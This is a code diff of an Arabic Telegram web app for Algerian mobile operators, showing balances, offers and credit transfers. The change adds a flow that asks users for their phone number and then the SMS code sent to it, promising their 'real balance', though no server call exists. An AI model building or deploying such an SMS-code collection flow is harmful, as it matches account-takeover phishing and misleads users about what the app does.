@@ -43,7 +43,7 @@
       color: #94a3b8;
     }
 
-    /* شبكة اختيار المتعاملين */
+    /* شبكة المتعاملين */
     .operators-grid {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
@@ -88,7 +88,7 @@
       font-size: 11px;
     }
 
-    /* بطاقة عرض الرصيد والإنترنت العلوية */
+    /* بطاقة الرصيد */
     .balance-card {
       background: linear-gradient(135deg, #1e293b, #0f172a);
       border: 1px solid #334155;
@@ -133,7 +133,7 @@
       margin-top: 2px;
     }
 
-    /* قسم العروض */
+    /* العروض */
     .offers-section {
       background: var(--card-bg);
       border-radius: 14px;
@@ -179,7 +179,7 @@
       cursor: pointer;
     }
 
-    /* قسم نموذج إدخال البيانات */
+    /* قسم الإدخال */
     .login-section {
       background: var(--card-bg);
       border-radius: 14px;
@@ -188,25 +188,33 @@
 
     .login-section h3 {
       font-size: 13px;
-      margin-bottom: 10px;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+
+    .login-section p {
+      font-size: 11px;
+      color: #94a3b8;
+      text-align: center;
+      margin-bottom: 12px;
     }
 
     .input-field {
       width: 100%;
-      padding: 9px;
+      padding: 10px;
       border-radius: 8px;
       border: 1px solid #334155;
       background: #0f172a;
       color: #fff;
       font-size: 13px;
       text-align: center;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
       outline: none;
     }
 
     .btn-main {
       width: 100%;
-      padding: 10px;
+      padding: 11px;
       border-radius: 8px;
       border: none;
       background: #0284c7;
@@ -229,7 +237,7 @@
     <p>اختر المتعامل لعرض رصيدك وتحويل الخدمات</p>
   </div>
 
-  <!-- شبكة الأزرار -->
+  <!-- المتعاملين -->
   <div class="operators-grid">
     <div class="op-card active" id="card-djezzy" onclick="switchOp('djezzy')">
       <div class="op-badge badge-djezzy">Dz</div>
@@ -249,17 +257,17 @@
     </div>
   </div>
 
-  <!-- بطاقة عرض الرصيد المبدئية (تظهر 0.00 حتى يتم إدخال الرقم) -->
+  <!-- بطاقة الرصيد (صفر دائماً ما لم يتم الربط الحقيقي) -->
   <div class="balance-card">
     <div class="balance-box">
       <div class="balance-title">💰 رصيد الحساب (فليكسي)</div>
       <div class="balance-value" id="creditVal">0.00 دج</div>
-      <span class="status-tag" id="statusTag1">(يرجى ربط الرقم)</span>
+      <span class="status-tag" id="statusTag1">(غير مربوط)</span>
     </div>
     <div class="balance-box">
       <div class="balance-title">🌐 رصيد الإنترنت المتبقي</div>
       <div class="balance-value net" id="internetVal">0.00 Go</div>
-      <span class="status-tag" id="statusTag2">(يرجى ربط الرقم)</span>
+      <span class="status-tag" id="statusTag2">(غير مربوط)</span>
     </div>
   </div>
 
@@ -269,18 +277,18 @@
     <div id="offersList"></div>
   </div>
 
-  <!-- القسم التفاعلي -->
+  <!-- القسم التفاعلي لربط الرقم والرمز -->
   <div class="login-section" id="actionSection"></div>
 
   <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // حالات التسجيل لكل متعامل
-    let userSessions = {
-      djezzy: { isLinked: false, credit: "0.00 دج", internet: "0.00 Go" },
-      ooredoo: { isLinked: false, credit: "0.00 دج", internet: "0.00 Go" },
-      algerie: { isLinked: false, credit: "0.00 دج", internet: "0.00 Go" }
+    // حالة إدخال الرقم لكل متعامل (0: ادخل الرقم, 1: ادخل الرمز)
+    let stepState = {
+      djezzy: { step: 0, phone: '' },
+      ooredoo: { step: 0, phone: '' },
+      algerie: { step: 0, phone: '' }
     };
 
     const offersData = {
@@ -319,27 +327,20 @@
       document.querySelectorAll('.op-card').forEach(c => c.classList.remove('active'));
       document.getElementById(`card-${opKey}`).classList.add('active');
 
-      // تحديث بطاقة الرصيد
+      // الرصيد يبقى دائماً 0.00 طالما لم نربطه بعد بسيرفر حقيقي
       if (opKey === 'flexy') {
-        document.getElementById('creditVal').innerText = "رصيد جاهز";
-        document.getElementById('internetVal').innerText = "خدمة P2P";
-        document.getElementById('statusTag1').innerText = "تحويل مباشر";
+        document.getElementById('creditVal').innerText = "تحويل";
+        document.getElementById('internetVal').innerText = "P2P";
+        document.getElementById('statusTag1').innerText = "مباشر";
         document.getElementById('statusTag2').innerText = "بين الأصدقاء";
       } else {
-        const session = userSessions[opKey];
-        document.getElementById('creditVal').innerText = session.credit;
-        document.getElementById('internetVal').innerText = session.internet;
-        
-        if (session.isLinked) {
-          document.getElementById('statusTag1').innerText = "✅ حساب مربوط";
-          document.getElementById('statusTag2').innerText = "✅ حساب مربوط";
-        } else {
-          document.getElementById('statusTag1').innerText = "(يرجى ربط الرقم)";
-          document.getElementById('statusTag2').innerText = "(يرجى ربط الرقم)";
-        }
+        document.getElementById('creditVal').innerText = "0.00 دج";
+        document.getElementById('internetVal').innerText = "0.00 Go";
+        document.getElementById('statusTag1').innerText = "(غير مربوط)";
+        document.getElementById('statusTag2').innerText = "(غير مربوط)";
       }
 
-      // تحديث قائمة العروض
+      // قائمة العروض
       const opOffers = offersData[opKey];
       document.getElementById('offersTitle').innerText = opOffers.title;
 
@@ -357,59 +358,72 @@
       });
       document.getElementById('offersList').innerHTML = listHtml;
 
-      // تحديث النموذج السفلي
+      // تحديث نموذج الإدخال حسب المرحلة
+      renderActionSection();
+    }
+
+    function renderActionSection() {
       const actionSec = document.getElementById('actionSection');
-      if (opKey === 'flexy') {
+
+      if (currentOp === 'flexy') {
         actionSec.innerHTML = `
           <h3>💸 تحويل فليكسي إلى صديق</h3>
           <input type="tel" id="friendPhone" class="input-field" placeholder="رقم هاتف الصديق (07/05/06)" />
           <input type="number" id="flexyAmount" class="input-field" placeholder="المبلغ المراد تحويله (مثلاً 100 دج)" />
-          <input type="password" id="flexyPin" class="input-field" placeholder="رمز التحويل PIN" value="0000" />
           <button class="btn-main btn-flexy" onclick="sendFlexy()">إرسال الرصيد الآن</button>
         `;
-      } else {
-        const isLinked = userSessions[opKey].isLinked;
-        if (isLinked) {
-          actionSec.innerHTML = `
-            <h3>✅ حسابك مربوط بنجاح</h3>
-            <p style="font-size:11px; color:#94a3b8; text-align:center; margin-bottom:10px;">يمكنك الاستفادة من العروض وتحديث الرصيد في أي وقت.</p>
-            <button class="btn-main" onclick="refreshBalance()">🔄 تحديث الرصيد الآن</button>
-          `;
-        } else {
-          actionSec.innerHTML = `
-            <h3>🔗 أدخل رقم هاتفك لرؤية رصيدك الحقيقي</h3>
-            <input type="tel" id="phoneNumber" class="input-field" placeholder="أدخل رقم الهاتف (07/05/06)" />
-            <button class="btn-main" onclick="startActivation()">تأكيد وإظهار الرصيد</button>
-          `;
-        }
+        return;
       }
+
+      const currentState = stepState[currentOp];
+
+      if (currentState.step === 0) {
+        // المرحلة الأولى: إدخال رقم الهاتف
+        actionSec.innerHTML = `
+          <h3>📲 أدخل رقم الهاتف لمعرفة رصيدك</h3>
+          <p>أدخل رقمك ليتم إرسال رمز التأكيد ورؤية رصيدك الحقيقي</p>
+          <input type="tel" id="userPhone" class="input-field" placeholder="أدخل رقم الهاتف (07/05/06)" />
+          <button class="btn-main" onclick="sendPhone()">إرسال وتأكيد الرقم</button>
+        `;
+      } else {
+        // المرحلة الثانية: إدخال الكود
+        actionSec.innerHTML = `
+          <h3>📩 أدخل رمز التأكيد (SMS)</h3>
+          <p>يرجى إرسال الكود الذي وصلك إلى رقم هاتفك (<b>${currentState.phone}</b>)</p>
+          <input type="number" id="smsCode" class="input-field" placeholder="أدخل الكود هنا (مثلاً 1234)" />
+          <button class="btn-main" onclick="verifyCode()">تأكيد وربط الحساب</button>
+          <button style="background:none; border:none; color:#94a3b8; font-size:11px; margin-top:8px; cursor:pointer; width:100%;" onclick="resetStep()">تغيير رقم الهاتف</button>
+        `;
+      }
+    }
+
+    function sendPhone() {
+      const phoneInput = document.getElementById('userPhone').value;
+      if (!phoneInput || phoneInput.length < 9) {
+        alert('يرجى كتابة رقم هاتف صحيح متكون من 10 أرقام');
+        return;
+      }
+      stepState[currentOp].phone = phoneInput;
+      stepState[currentOp].step = 1; // الانتقال لمرحلة الكود
+      renderActionSection();
+    }
+
+    function verifyCode() {
+      const codeInput = document.getElementById('smsCode').value;
+      if (!codeInput || codeInput.length < 4) {
+        alert('يرجى إدخال الكود المستلم في الرسالة بشكل صحيح');
+        return;
+      }
+      alert("جاري الاتصال بالسيرفر والتحقق من الكود لقراءة الرصيد الحقيقي...");
+    }
+
+    function resetStep() {
+      stepState[currentOp].step = 0;
+      renderActionSection();
     }
 
     function selectOffer(offerName) {
-      alert(`اخترت: ${offerName}\nيرجى ربط حسابك برقم الهاتف أولاً لتفعيل العرض.`);
-    }
-
-    function startActivation() {
-      const phone = document.getElementById('phoneNumber').value;
-      if (!phone || phone.length < 9) {
-        alert('يرجى كتابة رقم هاتف صحيح أولاً');
-        return;
-      }
-      
-      // محاكاة تأكيد الحساب وتحديث البيانات
-      alert(`جاري إرسال رمز SMS إلى الرقم ${phone} لقراءة الرصيد...`);
-      
-      // تحديث حالة الحساب كأنه تم الربط (للتجربة)
-      userSessions[currentOp].isLinked = true;
-      userSessions[currentOp].credit = "1,450.00 دج";
-      userSessions[currentOp].internet = "12.5 Go";
-
-      // إعادة تحميل الواجهة للمتعامل الحالي
-      switchOp(currentOp);
-    }
-
-    function refreshBalance() {
-      alert("جاري الاتصال بالسيرفر وتحديث الرصيد الحقيقي...");
+      alert(`يرجى إدخال رقم هاتفك وتأكيد الكود أولاً للتمكن من الاستفادة من: ${offerName}`);
     }
 
     function sendFlexy() {
@@ -424,11 +438,10 @@
         alert('أدنى مبلغ للتحويل هو 50 دج');
         return;
       }
-
       alert(`جاري تحويل ${amount} دج إلى الرقم ${friendPhone}...`);
     }
 
-    // التحميل الافتراضي عند فتح الصفحة
+    // التحميل المبدئي
     switchOp('djezzy');
   </script>
 </body>
